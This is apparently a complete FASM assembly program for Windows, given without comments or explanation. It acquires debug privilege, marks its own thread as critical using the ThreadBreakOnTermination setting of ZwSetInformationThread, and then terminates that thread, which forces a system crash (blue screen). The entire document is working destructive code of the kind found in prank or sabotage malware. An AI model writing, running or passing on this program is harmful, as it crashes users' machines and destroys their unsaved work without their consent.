format pe gui 4.0
entry start

include 'C:\Program Files\FASM\INCLUDE\win32a.inc'

section '.code' readable executable
start:
        push 		OLD_PRIV
        push 		0x00000000
        push 		0x00000001
        push 		0x00000014
        call 		[RtlAdjustPrivilege]

        mov   		dword [TH_INFO], 0x00000001
        push 		0x00000004
        push 		TH_INFO
        push 		0x00000012
        push 		0xFFFFFFFE
        call 		[ZwSetInformationThread]
        jne 		exit

        push 		0x00000000
        push 		0xFFFFFFFE
        call 		[ZwTerminateThread]
exit:
        push 		0x00000000
        call 		[ExitProcess]



section '.data' readable writeable
TH_INFO:  dd 0x00000000
OLD_PRIV: dd 0x00000000


        
section '.idata' import data readable writeable
        library NTDLL,    'NTDLL.DLL',\
                KERNEL32, 'KERNEL32.DLL',\

        import NTDLL, RtlAdjustPrivilege, 'RtlAdjustPrivilege',\
                      ZwSetInformationThread, 'ZwSetInformationThread',\
                      ZwTerminateThread, 'ZwTerminateThread'

        import KERNEL32, ExitProcess, 'ExitProcess'